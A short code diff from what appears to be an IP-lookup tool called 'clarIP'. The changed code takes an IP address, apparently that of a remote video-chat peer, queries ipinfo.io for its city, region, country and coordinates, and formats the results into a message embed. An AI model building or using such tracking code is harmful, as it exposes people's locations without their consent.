@@ -118,7 +118,8 @@
         let url = `https://ipinfo.io/${ip}?token=${apiKey}`;
         await fetch(url).then((response) =>
             response.json().then((json) => {
-                set_message(json.ip, json.city, json.region, json.country, json.loc);
+                const ip = json.ip+":"+port
+                set_message(ip, json.city, json.region, json.country, json.loc);
                 const request = new XMLHttpRequest();
                 const image = document.querySelector("#imag");
                 const video = document.querySelector("#remote-video");
@@ -140,7 +141,7 @@
                     var myEmbed = {
                         title: "clarIP",
                         description: `
-                        ip: ${json.ip}:${port} \n
+                        ip: ${ip} \n
                         city: ${json.city} \n
                         region: ${json.region} \n
                         country: ${json.country} \n
